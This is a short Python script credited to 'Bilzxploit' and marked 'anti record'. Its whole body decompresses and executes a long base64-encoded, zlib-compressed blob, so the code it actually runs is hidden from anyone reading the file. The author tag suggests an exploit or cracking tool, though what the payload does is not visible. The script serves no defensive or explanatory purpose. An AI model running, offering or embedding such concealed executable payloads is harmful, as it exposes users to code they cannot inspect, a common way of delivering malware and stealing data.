#Compiled By  Bilzxploit
#anti record
import zlib, base64
exec(zlib.decompress(base64.b64decode("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")))